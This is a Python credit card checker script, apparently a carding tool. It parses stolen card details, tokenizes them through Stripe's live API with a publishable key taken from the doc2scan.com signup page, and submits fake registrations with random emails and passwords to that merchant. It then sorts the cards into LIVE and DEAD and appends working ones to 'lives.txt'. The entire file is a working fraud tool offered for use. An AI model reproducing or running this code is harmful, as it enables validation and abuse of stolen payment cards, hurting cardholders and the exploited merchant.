from colorama import Fore, Back, init
from bs4 import BeautifulSoup
import requests
import random
import json
import time
import string
import os


def randomString2(stringLength=8):
    """Generate a random string of fixed length """
    letters= string.ascii_lowercase
    return ''.join(random.sample(letters,stringLength))

def StripeAutomate(credit_card, ccEntry, firstname="Jason", lastname="Anderson"):
    ccEntry = str(ccEntry)
    ccNum, ccMonth, ccYear, ccCode = credit_card.split('|')
    api_token = "https://api.stripe.com/v1/tokens"
    session = requests.Session()
    main_source = BeautifulSoup(session.get("https://doc2scan.com/signup-register.php").text, "html.parser")
    user_agent =  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
    
    headers = {
        'User-Agent': user_agent,
        'Accept': 'application/json',
        'Accept-Language': 'en-US',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://js.stripe.com',
    }

    stripe_data = {
        'time_on_page': random.randint(55382, 68020),
        'guid': 'e8c975ed-c2e1-4cfb-ac82-1fb96d4ad03f',
        'muid': '76fa122a-d9cf-44d8-b9ab-4e09c50bf66a',
        'sid': '34618fcb-8540-419c-8d6b-dd16d55c2ed6',
        'key': 'pk_live_kjBJXec9yM8XgF7cuBbqHV2H',
        'payment_user_agent': 'stripe.js/303cf2d',
        'card[number]': ccNum,
        'card[cvc]': ccCode,
        'card[exp_month]': ccMonth,
        'card[exp_year]': ccYear,
        'card[name]': firstname + ' ' + lastname,
    }
    
    stripe_response = json.loads(session.post(api_token, data=stripe_data, headers=headers).text)
    try:
        token = stripe_response['id']
    except Exception:
        print("[" + ccEntry + "] DEAD\t----\t" + credit_card + ' => ' + stripe_response['error']['message'] + ' / FRAUD DETECT!')
        return

    result_data = {
        'user_type': '1',
        'email_id': randomString2(20) + "@gmail.com",
        'password': randomString2(12),
        'card-name': firstname + ' ' + lastname,
        'card-number': ccNum,
        'card-cvc': ccCode,
        'amount': '1599',
        'email': 'none@none.com',
        'stripe_plan': 'STDmonthly199',
        'stripeToken': token,
        'stripe_plan': 'STDmonthly199',
        'amount': '1.99',
        'planid': 'STD',
        'planprice': '1.99',
        'term': 'monthly',
    }
    result = session.post('https://doc2scan.com/signup-register.php', data=result_data,).text
    try:
        res = BeautifulSoup(result, 'html.parser').findAll('font', {'color': 'red'})[1].get_text()
        if 'code' in res.lower():
            print(Fore.LIGHTGREEN_EX + "[" + ccEntry + "]" "LIVE\t----\t" + credit_card + ' => ' + res.replace("\n", "") + Fore.RESET)
            with open("lives.txt", "a") as filelive:
                filelive.write(credit_card + " - Invalid CVV")
                filelive.close()
            return("LIVE\t----\t" + credit_card + ' => ' + res.replace("\n", ""))
        else:
            print("[" + ccEntry + "] DEAD\t----\t" + credit_card + ' => ' + res.replace("\n", ""))
            return('DEAD\t----\t' + credit_card + " => " + res.replace("\n", ""))
    except Exception as e:
        print("LIVE\t----\t" + credit_card)
        with open("lives.txt", "a") as livefile:
            livefile.write(credit_card + " - Valid CVV")
            livefile.close()
        return("LIVE\t----\t" + credit_card)


